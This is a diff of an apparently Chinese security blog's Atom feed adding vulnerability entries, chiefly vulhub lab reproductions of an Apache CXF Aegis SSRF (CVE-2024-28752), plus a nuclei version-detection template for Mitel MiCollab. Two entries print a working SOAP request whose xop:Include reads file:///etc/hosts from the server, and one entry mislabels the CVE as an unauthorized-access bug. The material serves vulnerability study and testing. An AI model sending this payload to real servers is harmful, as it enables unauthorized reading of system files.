@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-17T07:30:32.649Z</updated>
+  <updated>2025-06-17T07:46:35.192Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,111 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Apache CXF Aegis DataBinding 服务器端请求伪造漏洞</title>
+    <link href="http://example.com/2025/06/17/github_1360253979/"/>
+    <id>http://example.com/2025/06/17/github_1360253979/</id>
+    <published>2025-06-17T07:46:35.191Z</published>
+    <updated>2025-06-17T07:46:35.192Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache CXF Aegis DataBinding 服务器端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-28752</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Apache CXF是一个开源服务框架，帮助用户使用前端编程API（如JAX-WS和JAX-RS）构建和开发服务。在Apache CXF 4.0.4、3.6.3和3.5.8之前的版本中，使用Aegis DataBinding存在一个SSRF漏洞，允许攻击者对至少接受一个任意类型参数的Web服务执行SSRF攻击。此漏洞特别影响使用Aegis DataBinding的服务，而使用其他数据绑定（包括默认绑定）的服务不受影响。攻击者可以利用此漏洞通过使服务器向任意URL发送请求来访问内部资源，可能导致信息泄露或对内部系统的进一步攻击。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache CXF</p><p><strong>影响版本：</strong> version &lt; 4.0.4, version &lt; 3.6.3, version &lt; 3.5.8</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2FREADME.md">https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2FREADME.md</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Apache-CXF-Aegis-DataBinding-Server-Side-Request-Forgery-CVE-2024-28752"><a href="#Apache-CXF-Aegis-DataBinding-Server-Side-Request-Forgery-CVE-2024-28752" class="headerlink" title="Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752)"></a>Apache CXF Aegis DataBinding Server-Side Request Forgery (CVE-2024-28752)</h2><p><a href="README.zh-cn.md">中文版本 (Chinese version)</a></p><p>Apache CXF is an open-source services framework that helps you build and develop services using frontend programming<br>APIs like JAX-WS and JAX-RS.</p><p>A SSRF vulnerability using the Aegis DataBinding in versions of Apache CXF before 4.0.4, 3.6.3 and 3.5.8 allows an<br>attacker to perform SSRF style attacks on webservices that take at least one parameter of any type. This vulnerability<br>specifically impacts services utilizing the Aegis DataBinding, while services using other data bindings, including the<br>default, are unaffected. Attackers can exploit this vulnerability to access internal resources by making the server send<br>requests to arbitrary URLs, potentially leading to information disclosure or further attacks against internal systems.</p><p>References:</p><ul><li><a href="https://github.com/advisories/GHSA-qmgx-j96g-4428">https://github.com/advisories/GHSA-qmgx-j96g-4428</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28752">https://nvd.nist.gov/vuln/detail/CVE-2024-28752</a></li><li><a href="https://github.com/ReaJason/CVE-2024-28752">https://github.com/ReaJason/CVE-2024-28752</a></li></ul><h3 id="Environment-Environment"><a href="#Environment-Environment" class="headerlink" title="Environment Environment"></a>Environment Environment</h3><p>Execute the following command to start a vulnerable Apache CXF webservice with Aegis DataBinding:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><p>After the service starts, the vulnerable CXF webservice will be accessible at <code>http://your-ip:8080/test?wsdl</code>. The<br>service is configured to use Aegis DataBinding and accepts various parameter types, making it vulnerable to SSRF<br>attacks.</p><h3 id="Vulnerability-Reproduction"><a href="#Vulnerability-Reproduction" class="headerlink" title="Vulnerability Reproduction"></a>Vulnerability Reproduction</h3><p>Send this request to the server:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/related; boundary=----kkkkkk123123213<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>472<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xquery">------kkkkkk123123213</span><br><span class="language-xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="language-xquery"></span><br><span class="language-xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-attr">xmlns:web</span>=<span class="hljs-string">&quot;http://service.namespace/&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">   </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">web:test</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">         </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">arg0</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xop:Include</span> <span class="hljs-attr">xmlns:xop</span>=<span class="hljs-string">&quot;http://www.w3.org/2004/08/xop/include&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///etc/hosts&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xop:Include</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery"><span class="hljs-tag">&lt;/<span class="hljs-name">arg0</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery">      <span class="hljs-tag">&lt;/<span class="hljs-name">web:test</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery">   <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span></span><br><span class="language-xquery">------kkkkkk123123213--</span><br></code></pre></td></tr></table></figure><p><img src="/1.png" alt="1.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache CXF Aegis DataBinding 服务器端请求伪造漏洞</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+    <category term="服务器端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Apache CXF Aegis DataBinding 服务端请求伪造漏洞</title>
+    <link href="http://example.com/2025/06/17/github_2571249574/"/>
+    <id>http://example.com/2025/06/17/github_2571249574/</id>
+    <published>2025-06-17T07:46:19.877Z</published>
+    <updated>2025-06-17T07:46:19.875Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache CXF Aegis DataBinding 服务端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-28752</li></ul><p><strong>漏洞类型：</strong> 服务端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Apache CXF 在 4.0.4、3.6.3 和 3.5.8 版本之前存在一个使用 Aegis DataBinding 的 SSRF 漏洞，该漏洞允许攻击者对接受至少一个任意类型参数的 Web 服务执行 SSRF 攻击。此漏洞专门影响使用 Aegis DataBinding 的服务，而使用其他数据绑定 (包括默认数据绑定) 的服务不受影响。攻击者可以利用此漏洞通过让服务器向任意 URL 发送请求来访问内部资源，这可能导致信息泄露或对内部系统的进一步攻击。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache CXF</p><p><strong>影响版本：</strong> version &lt; 4.0.4, version &lt; 3.6.3, version &lt; 3.5.8</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2FREADME.zh-cn.md">https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2FREADME.zh-cn.md</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="Apache-CXF-Aegis-DataBinding-服务端请求伪造漏洞-CVE-2024-28752"><a href="#Apache-CXF-Aegis-DataBinding-服务端请求伪造漏洞-CVE-2024-28752" class="headerlink" title="Apache CXF Aegis DataBinding 服务端请求伪造漏洞 (CVE-2024-28752)"></a>Apache CXF Aegis DataBinding 服务端请求伪造漏洞 (CVE-2024-28752)</h2><p>Apache CXF 是一个开源的服务框架，帮助开发者使用 JAX-WS 和 JAX-RS 等前端编程 API 构建和开发服务。</p><p>Apache CXF 在 4.0.4、3.6.3 和 3.5.8 版本之前存在一个使用 Aegis<br>DataBinding 的 SSRF 漏洞，该漏洞允许攻击者对接受至少一个任意类型参数的 Web 服务执行 SSRF 攻击。此漏洞专门影响使用 Aegis<br>DataBinding 的服务，而使用其他数据绑定 (包括默认数据绑定) 的服务不受影响。攻击者可以利用此漏洞通过让服务器向任意 URL<br>发送请求来访问内部资源，这可能导致信息泄露或对内部系统的进一步攻击。</p><p>参考链接：</p><ul><li><a href="https://github.com/advisories/GHSA-qmgx-j96g-4428">https://github.com/advisories/GHSA-qmgx-j96g-4428</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28752">https://nvd.nist.gov/vuln/detail/CVE-2024-28752</a></li><li><a href="https://github.com/ReaJason/CVE-2024-28752">https://github.com/ReaJason/CVE-2024-28752</a></li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>执行如下命令启动一个存在漏洞的 Apache CXF Web 服务，该服务使用 Aegis DataBinding：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker compose up -d</span><br></code></pre></td></tr></table></figure><p>服务启动后，存在漏洞的 CXF Web 服务将可以通过 <code>http://your-ip:8080/test?wsdl</code> 访问。该服务配置为使用 Aegis<br>DataBinding 并接受各种参数类型，使其容易受到 SSRF 攻击。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>发送如下请求即可触发 SSRF 读取 <code>/etc/hosts</code> 文件内容：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:8080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/related; boundary=----kkkkkk123123213<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>472<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xquery">------kkkkkk123123213</span><br><span class="language-xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;1&quot;</span></span><br><span class="language-xquery"></span><br><span class="language-xquery"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Envelope</span> <span class="hljs-attr">xmlns:soapenv</span>=<span class="hljs-string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="hljs-attr">xmlns:web</span>=<span class="hljs-string">&quot;http://service.namespace/&quot;</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">   <span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Header</span>/&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">   </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">      </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">web:test</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery">         </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">arg0</span>&gt;</span></span></span><br><span class="language-xml"><span class="language-xquery"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">count</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">xop:Include</span> <span class="hljs-attr">xmlns:xop</span>=<span class="hljs-string">&quot;http://www.w3.org/2004/08/xop/include&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;file:///etc/hosts&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xop:Include</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">count</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery"><span class="hljs-tag">&lt;/<span class="hljs-name">arg0</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery">      <span class="hljs-tag">&lt;/<span class="hljs-name">web:test</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery">   <span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Body</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="language-xml"><span class="language-xquery"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span></span><br><span class="language-xquery">------kkkkkk123123213--</span><br></code></pre></td></tr></table></figure><p><img src="/1.png" alt="1.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache CXF Aegis DataBinding 服务端请求伪造漏洞&lt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+    <category term="服务端请求伪造" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Apache CXF 未授权访问漏洞</title>
+    <link href="http://example.com/2025/06/17/github_1988430754/"/>
+    <id>http://example.com/2025/06/17/github_1988430754/</id>
+    <published>2025-06-17T07:46:05.964Z</published>
+    <updated>2025-06-17T07:46:05.963Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Apache CXF 未授权访问漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-28752</li></ul><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> Apache CXF 3.2.14版本中存在未授权访问漏洞，攻击者可能利用此漏洞未经授权访问敏感信息或执行其他恶意操作。</p><p><strong>产品厂商：</strong> Apache</p><p><strong>产品名称：</strong> Apache CXF</p><p><strong>影响版本：</strong> 3.2.14</p><p><strong>来源：</strong> <a href="https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2Fdocker-compose.yml">https://github.com/vulhub/vulhub/blob/a5090422bb9171d764237e8493d2f659adf372c7/apache-cxf%2FCVE-2024-28752%2Fdocker-compose.yml</a></p><p><strong>类型：</strong> vulhub&#x2F;vulhub:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol"></span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  cxf:</span><br><span class="hljs-symbol">    image:</span> reajason/apache-cxf:<span class="hljs-number">3.2</span><span class="hljs-number">.14</span><br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;8080:8080&quot;</span><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Apache CXF 未授权访问漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    
+    <category term="vulhub/vulhub:github issues" scheme="http://example.com/tags/vulhub-vulhub-github-issues/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Mitel MiCollab Unified Communications Server (UCS) 版本信息泄露漏洞</title>
+    <link href="http://example.com/2025/06/17/github_2225844672/"/>
+    <id>http://example.com/2025/06/17/github_2225844672/</id>
+    <published>2025-06-17T07:45:44.859Z</published>
+    <updated>2025-06-17T07:45:44.858Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Mitel MiCollab Unified Communications Server (UCS) 版本信息泄露漏洞</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 低危</p><p><strong>漏洞描述：</strong> Mitel MiCollab UCS 通过&#x2F;ucs&#x2F;micollab&#x2F;version.json端点泄露版本信息。</p><p><strong>产品厂商：</strong> Mitel</p><p><strong>产品名称：</strong> Mitel MiCollab Unified Communications Server (UCS)</p><p><strong>搜索语法：</strong> http.html:MiCollab End User Portal</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/654f0d38f2326e89b5f6052ff4b3738a4b3125b8/http%2Ftechnologies%2Fmitel-micollab-ucs-version-detect.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/654f0d38f2326e89b5f6052ff4b3738a4b3125b8/http%2Ftechnologies%2Fmitel-micollab-ucs-version-detect.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mitel-micollab-ucs-version-detect</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mitel MiCollab Unified Communications Server (UCS) JSON Version - Detection</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">aushack</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">info</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">Mitel MiCollab UCS version disclosure via the /ucs/micollab/version.json endpoint.</span><br><span class="hljs-attribute">  metadata</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-comment"># verified: true</span><br>    <span class="hljs-attribute">max-request</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br>    <span class="hljs-attribute">shodan-query</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;http.html:MiCollab End User Portal&#x27;</span><br>  <span class="hljs-attribute">tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mitel,micollab,ucs,version,detect</span><br><br><span class="hljs-attribute">http</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">method: GET</span><br>    <span class="hljs-attribute">path</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/ucs/micollab/version.json&quot;</span><br><br>    <span class="hljs-attribute">matchers-condition</span><span class="hljs-punctuation">:</span> <span class="hljs-string">and</span><br>    <span class="hljs-attribute">matchers</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: status</span><br>        <span class="hljs-attribute">status</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">200</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: word</span><br>        <span class="hljs-attribute">words</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;&#123;&quot;version&quot;:&#x27;</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br><br>    <span class="hljs-attribute">extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: json</span><br>        <span class="hljs-attribute">part</span><span class="hljs-punctuation">:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">version</span><br>        <span class="hljs-attribute">json</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;.version&quot;</span><br>        <span class="hljs-attribute">group</span><span class="hljs-punctuation">:</span> <span class="hljs-string">1</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Mitel MiCollab Unified Communications S</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
+    
+  </entry>
   
   <entry>
     <title>Web3 安全入门避坑指南｜硬件钱包的常见陷阱</title>
@@ -440,114 +545,6 @@
     <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="目录遍历" scheme="http://example.com/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BERT 勒索软件利用武器化的 ELF 文件升级对 Linux 机器的攻击</title>
-    <link href="http://example.com/2025/06/17/weixin_2536028865/"/>
-    <id>http://example.com/2025/06/17/weixin_2536028865/</id>
-    <published>2025-06-17T01:03:54.469Z</published>
-    <updated>2025-06-17T01:03:54.465Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/cPGE1oJOyITlM4WwI9Zo3Q">https://mp.weixin.qq.com/s/cPGE1oJOyITlM4WwI9Zo3Q</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/cPGE1oJOyITlM4WwI9Zo3Q&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SinoTrack GPS 漏洞可能允许攻击者跟踪和控制车辆</title>
-    <link href="http://example.com/2025/06/17/weixin_2211067506/"/>
-    <id>http://example.com/2025/06/17/weixin_2211067506/</id>
-    <published>2025-06-17T01:03:54.142Z</published>
-    <updated>2025-06-17T01:03:54.137Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/VTY6l1aBcFkZ3NpGnnKrnw">https://mp.weixin.qq.com/s/VTY6l1aBcFkZ3NpGnnKrnw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 军哥网络安全读报&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/VTY6l1aBcFkZ3NpGnnKrnw&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="军哥网络安全读报" scheme="http://example.com/tags/%E5%86%9B%E5%93%A5%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AF%BB%E6%8A%A5/"/>
-    
